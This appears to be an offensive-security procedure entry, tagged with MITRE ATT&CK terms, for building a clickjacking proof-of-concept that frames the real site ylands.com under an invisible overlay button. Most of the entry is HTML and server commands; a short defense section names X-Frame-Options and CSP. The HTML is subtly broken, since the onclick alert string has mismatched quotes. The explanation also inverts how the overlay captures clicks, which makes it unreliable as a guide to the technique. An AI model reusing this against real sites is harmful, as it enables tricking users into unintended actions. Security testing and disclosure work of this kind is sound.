---
id: proc-demonstrate-clickjacking-poc
tags:
  - clickjacking
  - iframe
  - poc
  - ui-redressing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.827Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Demonstrate-Clickjacking-with-Iframe-POC

## Summary

This procedure creates a simple HTML proof-of-concept (POC) page that embeds a vulnerable Bohemia Interactive site in an iframe, demonstrating how attackers can overlay malicious elements to trick users into performing unintended actions like clicking hidden buttons.

## Description

By embedding sites like ylands.com in an iframe without X-Frame-Options restrictions, attackers can create invisible overlays that capture user interactions, leading to impacts such as unauthorized data entry or session hijacking. This targets web environments and requires only a text editor and browser. Expected outcomes: Visual demonstration of framming and overlay functionality, highlighting risks of confidential information exposure or user control compromise.

## Requirements

1. Text editor (e.g., VS Code, Notepad)
2. Local web server capability (e.g., Python's http.server)
3. Vulnerable URL confirmed from prior reconnaissance
4. Modern web browser for testing

## Defense

Defensive measures and detection strategies:

- Enforce X-Frame-Options header on all responses
- Validate iframe sources via CSP
- Educate users on phishing indicators and use browser extensions to detect overlays

## Objectives

1. Embed vulnerable site in iframe to confirm loadability
2. Add overlay to simulate click hijacking
3. Test POC to validate attack feasibility

## Instructions

### Step 1: Create the HTML POC File

**Context**: Construct an HTML file with an iframe and a semi-transparent overlay div positioned over interactive elements.

**Command** (Manual HTML creation):
```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking POC</title>
  <style>
    iframe { border: none; }
    .overlay { position: absolute; top: 150px; left: 200px; width: 120px; height: 40px; opacity: 0; z-index: 10; background: red; }
  </style>
</head>
<body>
  <iframe src="https://ylands.com/" width="800" height="600"></iframe>
  <div class="overlay">
    <button onclick="alert('Hijacked Click! Unauthorized action performed.")">Hidden Malicious Button</button>
  </div>
</body>
</html>
```

> Save as `clickjacking-poc.html`. The iframe loads the target, and the overlay captures clicks intended for the site's elements. Expected output: File ready for serving.

### Step 2: Serve and Test the POC

**Context**: Host the file locally and open in a browser to verify embedding and interaction hijacking.

**Command** (Local server):
```bash
python -m http.server 8000
```

> Run in the directory containing the HTML file, then navigate to http://localhost:8000/clickjacking-poc.html. Expected output: Page loads with embedded site; clicking the overlay area triggers the alert, demonstrating hijack without visible cues.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[poc]]
